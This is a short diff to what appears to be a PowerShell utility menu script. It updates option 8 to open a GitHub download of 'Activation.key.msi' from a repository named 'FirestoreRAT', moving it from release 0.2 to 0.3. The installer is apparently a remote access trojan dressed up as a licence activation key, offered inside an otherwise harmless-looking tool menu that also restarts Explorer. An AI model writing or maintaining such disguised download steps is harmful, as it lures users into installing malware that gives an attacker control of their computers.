@@ -206,7 +206,7 @@ while ($true) {
             Write-Host "  Explorer perezapushen!" -ForegroundColor Green
         }
         "8" {
-            Start-Process "https://github.com/bibonuwu/FirestoreRAT/releases/download/0.2/Activation.key.msi"
+            Start-Process "https://github.com/bibonuwu/FirestoreRAT/releases/download/0.3/Activation.key.msi"
         }
         "9" {
             Start-Process "https://www.youtube.com/@bibonuwu"
